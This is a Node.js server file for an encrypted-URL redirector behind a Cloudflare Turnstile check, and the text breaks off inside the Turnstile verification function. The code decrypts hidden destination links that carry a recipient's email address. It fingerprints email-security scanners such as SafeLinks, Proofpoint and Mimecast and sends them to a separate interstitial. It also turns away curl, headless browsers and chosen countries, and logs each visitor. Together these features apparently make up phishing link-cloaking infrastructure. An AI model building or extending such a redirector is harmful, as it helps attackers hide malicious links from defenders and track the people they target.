// server.js — AES redirector + Cloudflare Turnstile, hardened (v4.7 Advance Beta Arranged)
require("dotenv").config();
const express = require("express");
const crypto = require("crypto");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

// fetch (Node 18+ has global fetch)
let fetchFn = globalThis.fetch;
if (!fetchFn) { try { fetchFn = require("node-fetch"); } catch (_) {} }
const fetch = fetchFn;

// Optional local GeoIP (fallback if no edge headers)
let geoip = null;
try {
  geoip = require("geoip-lite");
  console.log(`[${new Date().toISOString()}] ℹ️ geoip-lite enabled as country fallback`);
} catch {
  console.log(`[${new Date().toISOString()}] ⚠️ geoip-lite not installed; ALLOWED_COUNTRIES depends on edge headers only`);
}

// ================== CONSTANTS ==================
const SANITIZATION_MAX_LENGTH = 2000;
const UA_TRUNCATE_LENGTH = 160;
const PATH_TRUNCATE_LENGTH = 200;
const ACCEPT_TRUNCATE_LENGTH = 80;
const REFERER_TRUNCATE_LENGTH = 160;
const BRUTE_FORCE_MIN_RATIO = 0.4;
const LOG_ENTRY_MAX_LENGTH = 300;
const EMAIL_DISPLAY_MAX_LENGTH = 80;
const URL_DISPLAY_MAX_LENGTH = 120;

const app = express();
const TRUST_PROXY_HOPS = parseInt(process.env.TRUST_PROXY_HOPS || "1", 10);
app.set("trust proxy", TRUST_PROXY_HOPS);

// ================== HELPER FUNCTIONS ==================
function mask(s){ if (!s) return ""; return s.length<=6 ? "*".repeat(s.length) : s.slice(0,4)+"…"+s.slice(-2); }

function safeZone(tz) {
  try {
    new Intl.DateTimeFormat('en-US', { timeZone: tz }).format();
    return tz;
  } catch {
    return 'UTC';
  }
}

const TIMEZONE = safeZone(process.env.TIMEZONE || 'UTC');

function formatLocal(ts, tz = TIMEZONE) {
  const d = ts instanceof Date ? ts : new Date(ts);
  const parts = new Intl.DateTimeFormat('en-US', {
    timeZone: tz,
    year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: true
  }).formatToParts(d);
  const p = Object.fromEntries(parts.map(x => [x.type, x.value]));
  return `${p.month}-${p.day}-${p.year} - ${p.hour}:${p.minute}:${p.second} ${p.dayPeriod}`;
}

function zoneLabel(tz = TIMEZONE) {
  const now = new Date();
  try {
    const parts = new Intl.DateTimeFormat('en-US', {
      timeZone: tz,
      timeZoneName: 'shortOffset'
    }).formatToParts(now);

    const name = parts.find(p => p.type === 'timeZoneName')?.value || '';
    const utc = name.replace(/^GMT/, 'UTC');

    const m = utc.match(/^UTC([+-])(\d{1,2})(?::?(\d{2}))?$/);
    if (m) {
      const sign = m[1];
      const hh = String(m[2]).padStart(2, '0');
      const mm = String(m[3] || '00').padStart(2, '0');
      return `${tz} (UTC${sign}${hh}:${mm})`;
    }
    return `${tz} (${utc || 'UTC'})`;
  } catch {
    const parts = new Intl.DateTimeFormat('en-US', {
      timeZone: tz,
      timeZoneName: 'short'
    }).formatToParts(now);
    const abbr = parts.find(p => p.type === 'timeZoneName')?.value || tz;
    return `${tz} (${abbr})`;
  }
}

function sanitizeOneLine(s) {
  return String(s)
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, " ")
    .replace(/[ \t]{2,}/g, " ")
    .trim()
    .slice(0, SANITIZATION_MAX_LENGTH);
}

const sanitizeLogLine = sanitizeOneLine;

function safeDecode(s) {
  try { return decodeURIComponent(s); } catch { return s; }
}

function decodeB64Any(s) {
  const b64 = s.replace(/-/g, "+").replace(/_/g, "/");
  const pad = b64 + "===".slice((b64.length + 3) % 4);
  return Buffer.from(pad, "base64");
}

function b64ToBuf(s, flavor = 'url') {
  try {
    let normalized = s || "";
    if (flavor === 'url') {
      normalized = normalized.replace(/-/g, "+").replace(/_/g, "/");
    }
    while (normalized.length % 4) normalized += "=";
    return Buffer.from(normalized, "base64");
  } catch { return null; }
}

function b64urlToBuf(s) {
  return b64ToBuf(s, 'url');
}

function b64stdToBuf(s) {
  return b64ToBuf(s, 'std');
}

function tryBase64UrlToUtf8(s) {
  try {
    const norm = (s || "").replace(/-/g, "+").replace(/_/g, "/");
    return Buffer.from(norm, "base64").toString("utf8");
  } catch { return null; }
}

function decodeB64urlLoose(s) {
  if (!s) return "";
  try {
    let u = s.replace(/-/g, '+').replace(/_/g, '/');
    while (u.length % 4) u += '=';
    return Buffer.from(u, 'base64').toString('utf8');
  } catch {}
  try {
    let u = s;
    while (u.length % 4) u += '=';
    return Buffer.from(u, 'base64').toString('utf8');
  } catch {}
  return "";
}

function hashFirstSeg(pathStr) {
  const decoded = safeDecode(String(pathStr || ""));
  const splitOn = ["//", "__", "--", "~~", "/"];
  let first = decoded;
  for (const d of splitOn) {
    const i = decoded.indexOf(d);
    if (i >= 0) { first = decoded.slice(0, i); break; }
  }
  return crypto.createHash("sha256").update(first).digest("base64url").slice(0, 32);
}

function isLikelyEmail(s) {
  return /^[^@\s]+@[^@\s]+\.[A-Za-z]{2,}$/i.test(s);
}

function maskEmail(e) {
  const [user, host=''] = e.split('@');
  const [dom, ...rest] = host.split('.');
  const u = user.length <= 2
    ? user[0] + '*'
    : user[0] + '*'.repeat(Math.max(1, user.length - 2)) + user.slice(-1);
  const d = dom ? (dom[0] + '*'.repeat(Math.max(1, dom.length - 2)) + dom.slice(-1)) : '';
  return `${u}@${[d, ...rest].join('.')}`;
}

function splitCipherAndEmail(baseString, decodeFn, isEmailFn) {
  const s = String(baseString || "");
  let mainPart = s, emailPart = "", delimUsed = "";

  function rhsDecodesToEmail(rhs) {
    if (!rhs) return { ok: false, decoded: "" };

    const cand1 = (decodeFn(rhs) || "").trim();
    if (cand1 && isEmailFn(cand1)) {
      return { ok: true, decoded: cand1, src: "b64" };
    }

    const cand2 = (safeDecode(rhs) || "").trim();
    if (cand2 && isEmailFn(cand2)) {
      return { ok: true, decoded: cand2, src: "raw" };
    }

    return { ok: false, decoded: "" };
  }

  const strongDelims = ["//","__","--","~~"];
  for (const d of strongDelims) {
    let i = s.lastIndexOf(d);
    while (i >= 0) {
      const rhs = s.slice(i + d.length);
      const chk = rhsDecodesToEmail(rhs);
      if (chk.ok) {
        mainPart = s.slice(0, i);
        emailPart = rhs;
        delimUsed = d;
        return { mainPart, emailPart, delimUsed };
      }
      i = s.lastIndexOf(d, i - 1);
    }
  }

  const j = s.lastIndexOf("/");
  if (j > 0) {
    const rhs = s.slice(j + 1);
    const chk = rhsDecodesToEmail(rhs);
    if (chk.ok) {
      mainPart = s.slice(0, j);
      emailPart = rhs;
      delimUsed = "/";
      return { mainPart, emailPart, delimUsed };
    }
  }

  return { mainPart, emailPart, delimUsed };
}

function normHost(h){ return (h||"").split(":")[0].replace(/\.$/,"").toLowerCase(); }

function parseMinHourToMs(v, fallbackMs) {
  const s = String(v ?? "").trim().toLowerCase();
  if (!s) return fallbackMs;
  const m = s.match(/^(\d+)\s*(m|h)?$/);
  if (!m) return fallbackMs;
  const n = parseInt(m[1], 10);
  const unit = m[2] || "m";
  const mult = unit === "h" ? 60 * 60 * 1000 : 60 * 1000;
  return n * mult;
}

function fmtDurMH(ms) {
  const minutes = Math.round(ms / 60000);
  if (minutes % 60 === 0) return `${minutes / 60}h`;
  return `${minutes}m`;
}

function explainDecryptFailure({ tried = [], lastErr = null, segLen = 0 }) {
  const t = tried.join("|") || "none";
  const msg = (lastErr && String(lastErr.message || lastErr)) || "";

  if (/authenticate|authentic/i.test(msg)) {
    return `likely AES key mismatch (GCM auth failed); tried=${t}`;
  }
  if (/Invalid key length|Invalid key|unsupported/i.test(msg)) {
    return `server key invalid or wrong size; tried=${t}`;
  }
  if (/bad decrypt|mac check/i.test(msg)) {
    return `ciphertext/tag corrupted; tried=${t}`;
  }
  if (segLen < 40) {
    return `input too short to be a valid iv||ct||tag; tried=${t}`;
  }
  return `not a recognized encrypted format (wrong delimiter, bad base64, or truncated payload); tried=${t}`;
}

function gcmDecryptWithKey(key, iv, ct, tag) {
  const dec = crypto.createDecipheriv("aes-256-gcm", key, iv);
  dec.setAuthTag(tag);
  return Buffer.concat([dec.update(ct), dec.final()]);
}

function gcmDecryptAnyKey(iv, ct, tag) {
  let lastErr = null;
  for (let i = 0; i < AES_KEYS.length; i++) {
    const key = AES_KEYS[i];
    try {
      const out = gcmDecryptWithKey(key, iv, ct, tag);
      return { buf: out, keyIndex: i, err: null };
    } catch (e) {
      lastErr = e;
    }
  }
  return { buf: null, keyIndex: -1, err: lastErr };
}

function tryDecryptAny(segment) {
  if (!segment) return { url: null, tried: [], lastErr: null };

  let s = safeDecode(segment);
  if (s.startsWith("_")) s = s.slice(1);

  const tried = [];
  let lastErr = null;

  if (s.includes(':')) {
    const parts = s.split(':');
    if (parts.length === 3) {
      for (const toBuf of [b64urlToBuf, b64stdToBuf]) {
        const flavor = toBuf === b64urlToBuf ? "url" : "std";
        tried.push(`colon-${flavor}`);
        const iv = toBuf(parts[0]), ct = toBuf(parts[1]), tag = toBuf(parts[2]);
        if (iv && ct && tag && iv.length >= 12 && tag.length === 16) {
          const r = gcmDecryptAnyKey(iv, ct, tag);
          if (r.buf) return { url: r.buf.toString("utf8"), tried, lastErr: null };
          lastErr = r.err || lastErr;
        }
      }
    }
  }

  for (const toBuf of [b64urlToBuf, b64stdToBuf]) {
    const flavor = toBuf === b64urlToBuf ? "url" : "std";
    tried.push(`single-${flavor}`);
    const buf = toBuf(s);
    if (buf && buf.length > 28) {
      for (const ivLen of [12, 16]) {
        if (buf.length > (ivLen + 16)) {
          const iv = buf.slice(0, ivLen), ct = buf.slice(ivLen, -16), tag = buf.slice(-16);
          const r = gcmDecryptAnyKey(iv, ct, tag);
          if (r.buf) return { url: r.buf.toString("utf8"), tried, lastErr: null };
          lastErr = r.err || lastErr;
        }
      }
    }
  }

  const maybe = tryBase64UrlToUtf8(s) || (b64stdToBuf(s)?.toString('utf8'));
  if (maybe && /^https?:\/\//i.test(maybe)) {
    tried.push("plain-b64-url");
    return { url: maybe, tried, lastErr: null };
  }

  return { url: null, tried, lastErr };
}

function bruteSplitDecryptFull(s){
  const minPrefix = Math.max(40, Math.floor(s.length * BRUTE_FORCE_MIN_RATIO));
  for (let k = s.length; k >= minPrefix; k--) {
    const prefix = s.slice(0, k);
    const got = tryDecryptAny(prefix);
    if (got && got.url && /^https?:\/\//i.test(got.url)) {
      const rest = s.slice(k);
      let emailRaw = rest;
      const j = rest.lastIndexOf('/');
      if (j >= 0) emailRaw = rest.slice(j+1);
      return { url: got.url, emailRaw, kTried: k };
    }
  }
  return null;
}

// ================== LOGGING SYSTEM ==================
const LOG_TO_FILE   = process.env.LOG_TO_FILE === "1";
const LOG_FILE      = process.env.LOG_FILE || path.join(process.cwd(), "visitors.log");
const MAX_LOG_LINES = parseInt(process.env.MAX_LOG_LINES || "2000", 10);
const BACKLOG_ON_CONNECT = parseInt(process.env.BACKLOG_ON_CONNECT || "200", 10);

const LOGS = [];
const LOG_IDS = [];
let LOG_SEQ = 0;
const LOG_LISTENERS = new Set();

function sseSend(res, text, id) {
  if (id != null) res.write(`id: ${id}\n`);
  String(text).split(/\r?\n/).forEach(line => {
    res.write(`data: ${line}\n`);
  });
  res.write('\n');
}

function broadcastLog(line, id) {
  for (const res of LOG_LISTENERS) {
    try { sseSend(res, line, id); } catch {}
  }
}

function addLog(message) {
  const now = new Date();
  const tsLocal = formatLocal(now);

  const parts = String(message).replace(/\r\n/g, "\n").split("\n");

  for (const raw of parts) {
    const line = sanitizeOneLine(raw);
    const entry = `[${tsLocal}] ${line}`;
    const id = ++LOG_SEQ;

    console.log(entry);

    LOGS.push(entry);
    LOG_IDS.push(id);
    if (LOGS.length > MAX_LOG_LINES) { LOGS.shift(); LOG_IDS.shift(); }

    broadcastLog(entry, id);
    if (LOG_TO_FILE) { try { fs.appendFileSync(LOG_FILE, entry + "\n"); } catch {} }
  }
}

function addSpacer() {
  console.log("");
  const id = ++LOG_SEQ;
  LOGS.push("");
  LOG_IDS.push(id);
  if (LOG_TO_FILE) { try { fs.appendFileSync(LOG_FILE, "\n"); } catch {} }
  broadcastLog("", id);
}

// ================== SECURITY & RATE LIMITING ==================
const RATE_CAPACITY = parseInt(process.env.RATE_CAPACITY || "5", 10);
const RATE_WINDOW_SECONDS = parseInt(process.env.RATE_WINDOW_SECONDS || "600", 10);
const RATE_PER_MS = RATE_CAPACITY / (RATE_WINDOW_SECONDS*1000);
const inMemBuckets = new Map();

function inMemTokenBucket(key, now) {
  let st = inMemBuckets.get(key); if (!st) st = { tokens: RATE_CAPACITY, ts: now };
  if (now > st.ts) { const d=now-st.ts; st.tokens = Math.min(RATE_CAPACITY, st.tokens + d*RATE_PER_MS); st.ts=now; }
  let allowed=false, retryAfterMs=0;
  if (st.tokens>=1){ st.tokens-=1; allowed=true; } else { retryAfterMs = Math.ceil((1-st.tokens)/RATE_PER_MS); }
  inMemBuckets.set(key, st);
  return { allowed, retryAfterMs };
}

async function isRateLimited(ip) {
  const { allowed, retryAfterMs } = inMemTokenBucket(`rl:${ip}`, Date.now());
  return { limited: !allowed, retryAfterMs };
}

const BAN_TTL_SEC       = parseInt(process.env.BAN_TTL_SEC || "3600", 10);
const BAN_AFTER_STRIKES = parseInt(process.env.BAN_AFTER_STRIKES || "4", 10);
const STRIKE_WEIGHT_HP  = parseInt(process.env.STRIKE_WEIGHT_HP || "3", 10);
const inMemBans = new Map();
const inMemStrikes = new Map();

function isBanned(ip) {
  const until = inMemBans.get(ip);
  if (!until) return false;
  if (Date.now() > until) { inMemBans.delete(ip); return false; }
  return true;
}

function addStrike(ip, weight=1){
  const c = (inMemStrikes.get(ip) || 0) + weight;
  inMemStrikes.set(ip, c);
  if (c >= BAN_AFTER_STRIKES) {
    inMemBans.set(ip, Date.now() + BAN_TTL_SEC*1000);
    inMemStrikes.delete(ip);
    addLog(`[BAN] ip=${ip} for ${BAN_TTL_SEC}s`);
    addSpacer();
  }
}

function makeIpLimiter({ capacity, windowSec, keyPrefix }) {
  const RATE_PER_MS_LOCAL = capacity / (windowSec * 1000);
  const buckets = new Map();
  return function ipLimit(req, res, next) {
    if (isAdmin?.(req) || isAdminSSE?.(req)) return next();
    const ip = getClientIp(req) || "unknown";
    const key = `${keyPrefix}:${ip}`;
    const now = Date.now();
    let st = buckets.get(key);
    if (!st) st = { tokens: capacity, ts: now };
    if (now > st.ts) {
      const d = now - st.ts;
      st.tokens = Math.min(capacity, st.tokens + d * RATE_PER_MS_LOCAL);
      st.ts = now;
    }
    if (st.tokens >= 1) {
      st.tokens -= 1;
      buckets.set(key, st);
      return next();
    }
    const retryAfterMs = Math.ceil((1 - st.tokens) / RATE_PER_MS_LOCAL);
    res.setHeader("Retry-After", Math.ceil(retryAfterMs / 1000));
    addLog(`[RL:${keyPrefix}] 429 ip=${ip} path=${req.path}`);
    addSpacer();
    return res.status(429).send("Too many requests");
  };
}

// ================== ADMIN AUTH ==================
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "";

function isAdmin(req) {
  if (!ADMIN_TOKEN) return false;
  const h = req.headers["authorization"];
  if (!h || typeof h !== "string") return false;
  const m = h.match(/^Bearer\s+(.+)$/i);
  if (!m) return false;
  return m[1] === ADMIN_TOKEN;
}

function requireAdmin(req, res, next) {
  if (!isAdmin(req)) {
    return res.status(401).type("text/plain").send("Unauthorized");
  }
  return next();
}

const EPHEMERAL_TTL_MS = 5 * 60 * 1000;
const EPHEMERAL_SECRET = process.env.ADMIN_TOKEN || "dev-secret";

function mintEphemeralToken() {
  const exp = Date.now() + EPHEMERAL_TTL_MS;
  const msg = `sse:${exp}`;
  const sig = crypto.createHmac('sha256', EPHEMERAL_SECRET).update(msg).digest('base64url');
  return `ts:${exp}:${sig}`;
}

function verifyEphemeralToken(tok) {
  const m = /^ts:(\d+):([A-Za-z0-9_-]+)$/.exec(tok || "");
  if (!m) return false;
  const exp = +m[1], sig = m[2];
  if (Date.now() > exp) return false;
  const msg = `sse:${exp}`;
  const expect = crypto.createHmac('sha256', EPHEMERAL_SECRET).update(msg).digest('base64url');
  return sig === expect;
}

function isAdminSSE(req) {
  const hdr = req.headers.authorization || "";
  if (hdr.startsWith("Bearer ") && hdr.slice(7) === process.env.ADMIN_TOKEN) return true;

  const qTok = req.query.token && String(req.query.token);
  if (!qTok) return false;

  if (qTok === process.env.ADMIN_TOKEN) return true;
  return verifyEphemeralToken(qTok);
}

// ================== AES KEY MANAGEMENT ==================
const DEBUG_SHOW_KEYS_ON_START   = (process.env.DEBUG_SHOW_KEYS_ON_START || "0") === "1";
const DEBUG_ALLOW_PLAINTEXT_KEYS = (process.env.DEBUG_ALLOW_PLAINTEXT_KEYS || "0") === "1";
const EXPECT_AES_SHA256          = (process.env.AES_KEY_SHA256 || "").toLowerCase().replace(/[^0-9a-f]/g, "");

function loadKeysFromEnv() {
  const keys = [];

  const hex = (process.env.AES_KEY_HEX || "").trim();
  if (hex) {
    if (!/^[0-9a-fA-F]{64}$/.test(hex)) throw new Error("AES_KEY_HEX must be 64 hex chars");
    keys.push(Buffer.from(hex, "hex"));
  }

  const rawList = (process.env.AES_KEYS || process.env.AES_KEY || "")
    .split(",").map(s => s.trim()).filter(Boolean);
  for (const k of rawList) {
    if (!/^[A-Za-z0-9_-]+$/.test(k)) {
      throw new Error("AES_KEY(S) must be base64url (A–Z a–z 0–9 _ -)");
    }
    const buf = decodeB64Any(k);
    if (buf.length !== 32) throw new Error("Each AES key must decode to 32 bytes");
    keys.push(buf);
  }

  if (!keys.length) throw new Error("No AES key configured. Set AES_KEYS or AES_KEY or AES_KEY_HEX");
  return keys;
}

const AES_KEYS = loadKeysFromEnv();

if (EXPECT_AES_SHA256) {
  const got = crypto.createHash("sha256").update(AES_KEYS[0]).digest("hex");
  if (!got.startsWith(EXPECT_AES_SHA256)) {
    console.error(`[FATAL] AES key fingerprint mismatch. expected=${EXPECT_AES_SHA256.slice(0,10)}… got=${got.slice(0,10)}…`);
    process.exit(1);
  }
}

{
  const prints = AES_KEYS.map((k,i) => {
    const sha = crypto.createHash("sha256").update(k).digest("hex");
    return `#${i} len=${k.length} sha256=${sha.slice(0,10)}…`;
  }).join(", ");
  addLog(`[KEY] Loaded ${AES_KEYS.length} AES key(s): ${prints}`);
  addSpacer();
}

if (DEBUG_SHOW_KEYS_ON_START) {
  const raw = (process.env.AES_KEYS || process.env.AES_KEY || process.env.AES_KEY_HEX || "").trim();
  console.log("[DEBUG] AES_KEY(S) raw:", raw);
}

// ================== CHALLENGE TOKEN FUNCTIONS ==================
function createChallengeToken(nextEnc) {
  const exp = Date.now() + (10 * 60 * 1000);
  const payload = { next: nextEnc, exp, ts: Date.now() };
  const token = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', process.env.ADMIN_TOKEN)
                   .update(token).digest('base64url');
  return `${token}.${sig}`;
}

function verifyChallengeToken(challengeToken) {
  if (!challengeToken || typeof challengeToken !== 'string') return null;
  
  const parts = challengeToken.split('.');
  if (parts.length !== 2) return null;
  
  const [token, sig] = parts;
  
  const expectedSig = crypto.createHmac('sha256', process.env.ADMIN_TOKEN)
                          .update(token).digest('base64url');
  if (sig !== expectedSig) return null;
  
  try {
    const payload = JSON.parse(Buffer.from(token, 'base64url').toString());
    if (Date.now() > payload.exp) return null;
    return payload;
  } catch (e) {
    return null;
  }
}

function encryptChallengeData(payload) {
  const json = JSON.stringify(payload);
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', AES_KEYS[0], iv);
  const encrypted = Buffer.concat([cipher.update(json, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, encrypted, tag]).toString('base64url');
}

function decryptChallengeData(encryptedData) {
  try {
    const buf = Buffer.from(encryptedData, 'base64url');
    const iv = buf.slice(0, 12);
    const ciphertext = buf.slice(12, -16);
    const tag = buf.slice(-16);
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', AES_KEYS[0], iv);
    decipher.setAuthTag(tag);
    
    const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    return JSON.parse(decrypted.toString('utf8'));
  } catch (e) {
    return null;
  }
}

// ================== CLIENT IP & GEO FUNCTIONS ==================
function getClientIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-nf-client-connection-ip"] ||
    req.headers["x-real-ip"] ||
    req.ip ||
    ""
  );
}

function getCountry(req){
  const h=req.headers;
  const nf=h["x-nf-geo"]; if (nf){ try{ const o=JSON.parse(nf); if (o.country) return String(o.country).toUpperCase(); }catch{} }
  const cf=h["cf-ipcountry"]||h["cf-edge-country"]; if (cf) return String(cf).toUpperCase();
  const vercel=h["x-vercel-ip-country"]; if (vercel) return String(vercel).toUpperCase();
  if (geoip) {
    const ip = getClientIp(req);
    const look = geoip.lookup(ip);
    if (look && look.country) return String(look.country).toUpperCase();
  }
  return null;
}

function getASN(req){ const asn=req.headers["cf-asn"]||req.headers["x-asn"]; return asn?String(asn).toUpperCase():null; }

// ================== SECURITY POLICY FUNCTIONS ==================
const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || "").split(",").map(s=>s.trim().toUpperCase()).filter(Boolean);
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || "").split(",").map(s=>s.trim().toUpperCase()).filter(Boolean);
const BLOCKED_ASNS      = (process.env.BLOCKED_ASNS || "").split(",").map(s=>s.trim().toUpperCase()).filter(Boolean);
const EXPECT_HOSTNAME   = process.env.TURNSTILE_EXPECT_HOSTNAME || ".netlify.app,.onrender.com,.vercel.app";
const MAX_TOKEN_AGE_SEC = parseInt(process.env.TURNSTILE_MAX_TOKEN_AGE_SEC || "90", 10);
const ENFORCE_ACTION    = (process.env.TURNSTILE_ENFORCE_ACTION || "1") === "1";
const HEADLESS_BLOCK    = (process.env.HEADLESS_BLOCK || "0") === "1";
const HEADLESS_STRIKE_WEIGHT = parseInt(process.env.HEADLESS_STRIKE_WEIGHT || "3", 10);
const HEADLESS_SOFT_STRIKE   = (process.env.HEADLESS_SOFT_STRIKE || "0") === "1";

const ALLOWLIST_DOMAINS  = (process.env.ALLOWLIST_DOMAINS  || "righttodreamdk.com,tests.com")
  .split(",").map(s=>s.trim()).filter(Boolean);
const ALLOWLIST_SUFFIXES = (process.env.ALLOWLIST_SUFFIXES || ".netlify.app,.onrender.com")
  .split(",").map(s=>s.trim()).filter(Boolean);

const EXPECT_HOSTNAME_LIST   = (EXPECT_HOSTNAME || "")
  .split(",").map(s => s.trim().toLowerCase()).filter(Boolean);
const EXPECT_HOSTNAME_EXACT  = new Set(EXPECT_HOSTNAME_LIST.filter(h => !h.startsWith(".")));
const EXPECT_HOSTNAME_SUFFIX = EXPECT_HOSTNAME_LIST.filter(h => h.startsWith("."));

function countryBlocked(country){
  if (!country) return false;
  if (ALLOWED_COUNTRIES.length && !ALLOWED_COUNTRIES.includes(country)) return true;
  if (BLOCKED_COUNTRIES.includes(country)) return true;
  return false;
}

function asnBlocked(asn){ return !!asn && BLOCKED_ASNS.includes(asn); }

// ================== SCANNER DETECTION ==================
const SCANNER_PATTERNS = [
  {
    pattern: /safelinks\.protection\.outlook\.com|microsoft.*safelinks/i,
    name: "Microsoft SafeLinks",
    confidence: 0.95,
    type: "enterprise"
  },
  {
    pattern: /proofpoint|ppops-.*-(\d+)/i,
    name: "Proofpoint TAP",
    confidence: 0.90,
    type: "enterprise" 
  },
  {
    pattern: /mimecast|mimecast-control-center/i,
    name: "Mimecast",
    confidence: 0.90,
    type: "enterprise"
  },
  {
    pattern: /barracuda|bemailhec/i,
    name: "Barracuda",
    confidence: 0.85,
    type: "enterprise"
  },
  {
    pattern: /(microsoft-office|outlook).*scan|eop/i,
    name: "Office 365 EOP",
    confidence: 0.80,
    type: "enterprise"
  },
  {
    pattern: /url.*proxy|link.*scan|security.*scan/i,
    name: "Generic URL Scanner",
    confidence: 0.70,
    type: "generic"
  },
  {
    pattern: /apwk/i,
    name: "APWK Scanner",
    confidence: 0.75,
    type: "generic"
  }
];

const EXTERNAL_SCANNER_CONFIG = process.env.SCANNER_CONFIG_URL || null;
let dynamicScanners = [];

async function loadScannerPatterns() {
  if (EXTERNAL_SCANNER_CONFIG) {
    try {
      const response = await fetch(EXTERNAL_SCANNER_CONFIG);
      dynamicScanners = await response.json();
      addLog(`[SCANNER] Loaded ${dynamicScanners.length} external scanner patterns`);
    } catch (error) {
      addLog(`[SCANNER] Failed to load external patterns: ${error.message}`);
    }
  }
}

function detectScannerEnhanced(req) {
  const ua = (req.get("user-agent") || "").toLowerCase();
  const ip = getClientIp(req);
  
  let detected = [];
  const allPatterns = [...SCANNER_PATTERNS, ...dynamicScanners];
  
  for (const scanner of allPatterns) {
    if (scanner.pattern.test(ua)) {
      detected.push({
        ...scanner,
        matchedString: ua.match(scanner.pattern)[0],
        ip: ip
      });
    }
  }
  
  return detected.sort((a, b) => b.confidence - a.confidence);
}

const SCANNER_STATS = { total: 0, byReason: Object.create(null), byUA: Object.create(null) };

function computeScannerStatsFromLogs() {
  const byReason = Object.create(null);
  const byUA = Object.create(null);
  let total = 0;

  const lines = Array.isArray(LOGS) ? LOGS : [];
  for (const line of lines) {
    if (!line || typeof line !== 'string') continue;

    if (line.includes("[SCANNER] 200 interstitial")) {
      total += 1;

      let reason = "unknown";
      const rPos = line.indexOf(" reason=");
      if (rPos >= 0) {
        let tail = line.slice(rPos + 8);
        const nPos = tail.indexOf(" nextLen=");
        if (nPos >= 0) tail = tail.slice(0, nPos);
        reason = tail.trim().replace(/_/g, " ");
      }
      try { reason = decodeURIComponent(reason.replace(/\+/g, " ")); } catch {}

      let uaKey = "(empty)";
      try {
        const mU = /ua="([^"]{0,200})"/.exec(line);
        const ua = (mU && mU[1]) ? mU[1] : "(empty)";
        uaKey = (ua.split(/[;\s]/)[0] || "(empty)").toLowerCase();
      } catch {}

      byReason[reason] = (byReason[reason] || 0) + 1;
      byUA[uaKey] = (byUA[uaKey] || 0) + 1;
    }
  }

  return { total, byReason, byUA };
}

function logScannerHit(req, reason, nextEnc) {
  const ip   = getClientIp(req);
  const ua   = (req.get("user-agent") || "").slice(0, UA_TRUNCATE_LENGTH);
  const path = (req.originalUrl || req.path || "").slice(0, PATH_TRUNCATE_LENGTH);
  const ref  = (req.get("referer") || req.get("referrer") || "").slice(0, REFERER_TRUNCATE_LENGTH);
  const acc  = (req.get("accept") || "").slice(0, ACCEPT_TRUNCATE_LENGTH);

  SCANNER_STATS.total++;
  SCANNER_STATS.byReason[reason] = (SCANNER_STATS.byReason[reason] || 0) + 1;
  const uaKey = ua.toLowerCase().split(/[;\s]/)[0] || "(empty)";
  SCANNER_STATS.byUA[uaKey] = (SCANNER_STATS.byUA[uaKey] || 0) + 1;

  addLog(`[SCANNER] 200 interstitial ip=${ip} ua="${ua}" path="${path}" accept="${acc}" referer="${ref}" reason=${reason} nextLen=${(nextEnc||"").length}`);
  addSpacer();
}

// ================== HEADLESS DETECTION ==================
const UA_HEADLESS_MARKS = [ 
  "headless","puppeteer","playwright","phantomjs","selenium","wdio","cypress",
  "curl","wget","python-requests","httpclient","okhttp","java","go-http-client",
  "libwww","aiohttp","node-fetch","powershell"
];
const SUSPICIOUS_HEADERS = ["x-puppeteer","x-headless-browser","x-should-not-exist","x-playwright","x-automation","x-bot"];

function headlessSuspicion(req){
  const reasons = [];
  const hard = [];
  const soft = [];

  const uaRaw = req.get("user-agent") || "";
  const ua = uaRaw.toLowerCase();

  const isChromiumUA = /\b(Chrome|CriOS|Edg|OPR|Brave)\b/i.test(uaRaw) && !/\bMobile Safari\b/i.test(uaRaw);
  const isSafariUA   = /\bSafari\/\d+/i.test(uaRaw) && !/\b(Chrome|CriOS)\/\d+/i.test(uaRaw);
  const isFirefoxUA  = /\bFirefox\/\d+/i.test(uaRaw);

  const expect = {
    clientHints: isChromiumUA,
    fetchMeta:   isChromiumUA
  };

  for (const m of UA_HEADLESS_MARKS) {
    if (ua.includes(m)) { reasons.push("ua:"+m); hard.push("ua:"+m); break; }
  }
  for (const h of SUSPICIOUS_HEADERS) {
    if (req.headers[h]) { reasons.push("hdr:"+h); hard.push("hdr:"+h); }
  }

  if (!req.get("accept-language")) { reasons.push("missing:accept-language"); soft.push("missing:accept-language"); }

  if (expect.clientHints && !req.get("sec-ch-ua"))       { reasons.push("missing:sec-ch-ua");       soft.push("missing:sec-ch-ua"); }
  if (expect.fetchMeta   && !req.get("sec-fetch-site"))   { reasons.push("missing:sec-fetch-site");  soft.push("missing:sec-fetch-site"); }

  const accept = req.get("accept") || "";
  if (accept && !/text\/html|application\/xhtml\+xml/i.test(accept)) {
    reasons.push("accept-not-html"); hard.push("accept-not-html");
  }

  return { 
    suspicious: reasons.length > 0, 
    reasons, 
    hardCount: hard.length, 
    softCount: soft.length,
    isSafariUA,
    isFirefoxUA,
    isChromiumUA
  };
}

// ================== TURNSTILE FUNCTIONS ==================
const TURNSTILE_SITEKEY = process.env.TURNSTILE_SITEKEY || "";
const TURNSTILE_SECRET  = process.env.TURNSTILE_SECRET  || "";
const TURNSTILE_ORIGIN  = "https://challenges.cloudflare.com";
if (!TURNSTILE_SITEKEY || !TURNSTILE_SECRET) {
  console.error("❌ TURNSTILE_SITEKEY and TURNSTILE_SECRET must be set.");
  process.exit(1);
}

async function verifyTurnstileToken(token, remoteip, expected) {
  if (!TURNSTILE_SECRET || !token) return { ok:false, reason:"missing" };
  try {
    const resp = await fetch(TURNSTILE_ORIGIN + "/turnstile/v0/siteverify", {
      method:"POST",
      headers:{ "Content-Type":"application/x-www-form-urlencoded" },
      body:new URLSearchParams({ secret:TURNSTILE_SECRET, response:token, remoteip:remoteip||"" })
    });
    const data = await resp.json();

    if (!data.success) {
